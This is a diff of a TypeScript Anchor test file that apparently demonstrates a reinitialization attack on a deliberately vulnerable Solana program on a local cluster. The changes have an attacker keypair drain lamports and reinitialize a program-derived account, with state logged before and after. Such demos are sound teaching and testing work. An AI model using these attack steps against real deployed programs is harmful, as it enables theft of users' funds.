@@ -20,6 +20,18 @@ async function airDropSol(
   }
 }
 
+async function getAccount(
+  address: anchor.web3.PublicKey,
+  provider: anchor.AnchorProvider
+) {
+  try {
+    const account = await provider.connection.getAccountInfo(address);
+    return account;
+  } catch (error) {
+    console.error(`Got error while frecting AccountInfo: ${error}`);
+  }
+}
+
 describe("reintialization_attack", () => {
   // Configure the client to use the local cluster.
   let provider = anchor.AnchorProvider.env();
@@ -31,6 +43,7 @@ describe("reintialization_attack", () => {
   let user_pda: anchor.web3.PublicKey;
   let amount: number;
   let attacker: anchor.web3.Keypair;
+  let attacker_pda: anchor.web3.PublicKey;
 
   it("Is initialized!", async () => {
     try {
@@ -50,10 +63,13 @@ describe("reintialization_attack", () => {
         })
         .signers([provider.wallet.payer])
         .rpc();
-
+      let userPDA = await program.account.user.fetch(user_pda);
+      console.log(
+        `Before attack the state of the Data --> admin: ${userPDA.userAdmin} and the balance: ${userPDA.balance}`
+      );
       console.log(`Everythinhg went well ${tx}`);
     } catch (error) {
-      console.log(`You got an error onciha ⚠️  :`, error);
+      console.error(`You got an error onciha ⚠️  :`, error);
     }
   });
 
@@ -69,7 +85,7 @@ describe("reintialization_attack", () => {
           systemProgram: SYSTEM_PROGRAM_ID,
         })
         .signers([attacker])
-        .rpc({ skipPreflight: true });
+        .rpc();
 
       console.log(`Attacker successfully drained the Lamports ${tx}`);
     } catch (error) {
@@ -82,23 +98,32 @@ describe("reintialization_attack", () => {
 
   it("ReintializationAttack 😈", async () => {
     try {
+      [attacker_pda] = anchor.web3.PublicKey.findProgramAddressSync(
+        [Buffer.from("user"), attacker.publicKey.toBytes()],
+        program.programId
+      );
+
       amount = 0;
 
       let tx = await program.methods
         .depositUserAmount(new anchor.BN(amount))
         .accountsStrict({
-          user: provider.wallet.payer.publicKey,
-          userAccount: user_pda,
+          user: attacker.publicKey,
+          userAccount: attacker_pda,
           systemProgram: SYSTEM_PROGRAM_ID,
         })
-        .signers([provider.wallet.payer])
+        .signers([attacker])
         .rpc({ skipPreflight: true });
 
       console.log(
         `Everythinhg went well attacker successfully reintialized the user_pda: ${tx}`
       );
+      const attackerPDA = await program.account.user.fetch(attacker_pda);
+      console.log(
+        `The new reintialized satate is ---> admin: ${attackerPDA.userAdmin} and balance ${attackerPDA.balance}`
+      );
     } catch (error) {
-      console.log(`Attacker failed in reintializing the user_pda`, error);
+      console.error(`Attacker failed in rein`, error);
     }
   });
 });
